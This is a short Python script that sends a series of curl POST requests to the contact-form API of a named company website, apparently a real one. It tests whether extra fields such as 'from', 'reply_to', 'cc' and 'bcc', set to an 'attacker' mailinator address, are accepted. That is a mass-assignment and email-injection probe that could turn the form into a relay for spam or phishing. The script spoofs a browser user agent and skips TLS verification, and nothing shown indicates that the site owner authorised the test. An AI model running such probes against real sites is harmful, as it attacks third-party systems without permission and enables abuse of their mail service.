import subprocess, time
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
AT = chr(64)

def send(fields, hdrs=None):
    args = ["curl","-sk","-A",UA,"-X","POST","https://www.infinitycapital.bh/api/send",
            "-H","Content-Type: application/x-www-form-urlencoded"]
    for k,v in fields.items():
        args += ["--data-urlencode",k+"="+v]
    if hdrs:
        for h in hdrs: args += ["-H",h]
    args += ["-o","/tmp/o4.bin","-D","/tmp/o4.hdr","-w","%{http_code}"]
    subprocess.run(args,capture_output=True,text=True)
    return open("/tmp/o4.bin","rb").read()[:300].decode("utf8","replace")

base = {"fname":"probe","lname":"sec","areacode":"973","tel":"5551234",
        "cname":"qa","subject":"hello","msg":"body","check":"on"}

# try mass-assignment of extra email fields
for extra_key in ["from","reply_to","replyTo","cc","bcc","from_email","replyto"]:
    f = dict(base); f["targets"] = "probe"+AT+"mailinator.com"; f[extra_key] = "attacker"+AT+"mailinator.com"
    print(extra_key, "->", send(f)); time.sleep(0.5)
